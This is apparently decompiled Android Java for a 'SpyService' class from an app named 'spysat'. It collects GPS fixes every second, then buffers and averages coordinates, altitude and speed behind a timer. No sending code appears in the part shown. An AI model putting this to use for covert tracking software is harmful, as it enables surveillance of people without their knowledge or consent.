	private static  sending
	private synteo.spysat.SpyService$MyCount counter
	private synteo.spysat.MyLoc currentLoc
	private android.location.LocationManager lm
	private android.location.LocationListener locationListener
	private final android.os.IBinder mBinder
	private java.util.Vector m_vecCords
	
	    static SpyService()
	    {
	        synteo.spysat.SpyService.sending = 0;
	        return;
	    }
	
	
	    public SpyService()
	    {
	        this.mBinder = new synteo.spysat.SpyService$LocalBinder(this);
	        return;
	    }
	
	
	    static synthetic synteo.spysat.MyLoc access$0(synteo.spysat.SpyService p1)
	    {
	        return p1.currentLoc;
	    }
	
	
	    static synthetic void access$1(synteo.spysat.SpyService p0, synteo.spysat.MyLoc p1)
	    {
	        p0.currentLoc = p1;
	        return;
	    }
	
	
	    static synthetic boolean access$2()
	    {
	        return synteo.spysat.SpyService.sending;
	    }
	
	
	    static synthetic void access$3(boolean p0)
	    {
	        synteo.spysat.SpyService.sending = p0;
	        return;
	    }
	
	
	    public static String now()
	    {
	        return new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new java.util.GregorianCalendar().getTime());
	    }
	
	
	    public void addCords(double p3, double p5, int p7, int p8)
	    {
	        synteo.spysat.MyLoc v0_1 = new synteo.spysat.MyLoc();
	        v0_1.lat = p3;
	        v0_1.lon = p5;
	        v0_1.alt = p7;
	        v0_1.spd = p8;
	        this.m_vecCords.add(v0_1);
	        return;
	    }
	
	
	    public synteo.spysat.MyLoc getCords()
	    {
	        synteo.spysat.MyLoc v9_12;
	        if (this.m_vecCords.size() != 0) {
	            double v4 = 0;
	            double v6 = 0;
	            int v3 = 0;
	            int v1 = 0;
	            synteo.spysat.MyLoc v9_3 = this.m_vecCords.iterator();
	            while (v9_3.hasNext()) {
	                synteo.spysat.MyLoc v8_1 = ((synteo.spysat.MyLoc) v9_3.next());
	                v4 += v8_1.lat;
	                v6 += v8_1.lon;
	                v3 += v8_1.alt;
	                if (v8_1.spd < 401) {
	                    v1 = v8_1.spd;
	                }
	            }
	            int v2 = this.m_vecCords.size();
	            synteo.spysat.MyLoc v0_1 = new synteo.spysat.MyLoc();
	            v0_1.lon = (v6 / ((double) v2));
	            v0_1.lat = (v4 / ((double) v2));
	            v0_1.spd = v1;
	            v0_1.alt = (v3 / v2);
	            v0_1.size = v2;
	            this.m_vecCords = new java.util.Vector();
	            v9_12 = v0_1;
	        } else {
	            v9_12 = 0;
	        }
	        return v9_12;
	    }
	
	
	    public boolean isEmptyCords()
	    {
	        int v0_2;
	        if (this.m_vecCords.size() != 0) {
	            v0_2 = 0;
	        } else {
	            v0_2 = 1;
	        }
	        return v0_2;
	    }
	
	
	    public android.os.IBinder onBind(android.content.Intent p2)
	    {
	        return this.mBinder;
	    }
	
	
	    public void onCreate()
	    {
	        this.lm = ((android.location.LocationManager) this.getSystemService("location"));
	        this.locationListener = new synteo.spysat.SpyService$MyLocationListener(this, 0);
	        this.lm.requestLocationUpdates("gps", 1000, ((float) synteo.spysat.Application.m_nDelta), this.locationListener);
	        this.currentLoc = new synteo.spysat.MyLoc();
	        this.m_vecCords = new java.util.Vector();
	        this.counter = new synteo.spysat.SpyService$MyCount(this);
	        this.counter.start();
	        return;
	    }
	
	
	    public void onDestroy()
	    {
	        this.counter.cancel();
	        this.counter = 0;
	        this.lm.removeUpdates(this.locationListener);
	        super.onDestroy();
	        return;
	    }
	
	
	    public void stop()
	    {
	        this.lm.removeUpdates(this.locationListener);
	        return;
	    }
	
